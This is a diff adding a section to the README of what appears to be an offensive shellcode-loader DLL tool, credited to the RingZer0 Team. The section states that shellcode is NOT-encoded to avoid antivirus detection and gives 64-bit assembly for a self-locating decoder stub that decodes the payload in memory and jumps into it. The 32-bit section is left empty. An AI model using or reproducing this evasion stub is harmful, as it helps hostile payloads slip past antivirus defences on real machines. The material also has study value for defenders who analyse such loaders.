@@ -68,5 +68,33 @@ C:\> x86_64-w64-mingw32-g++.exe -Wall -DBUILD_DLL -O2 -c maindll.cpp -o maindll.
 C:\> x86_64-w64-mingw32-g++.exe -shared -Wl,--dll maindll.o -o yourdll.dll -s 
 ```
 
+# Obfuscation shellcode
+
+The DLL encode the shellcode using a simple NOT encoder to avoid AV detection.
+
+# 64 bits NOT encoder source
+
+```
+_start:
+        call $ + 5
+        pop rbx
+        xor rax, rax
+        mov rcx, rax
+        mov cl, 128
+        add rbx, 16
+_loop:
+        not QWORD [rbx + rcx * 8]
+        loop _loop
+        add rbx, 8
+        push rbx
+        ret
+```
+
+# 32 bits NOT encoder source
+
+```
+
+```
+
 # Credit
 Mr.Un1k0d3r RingZer0 Team
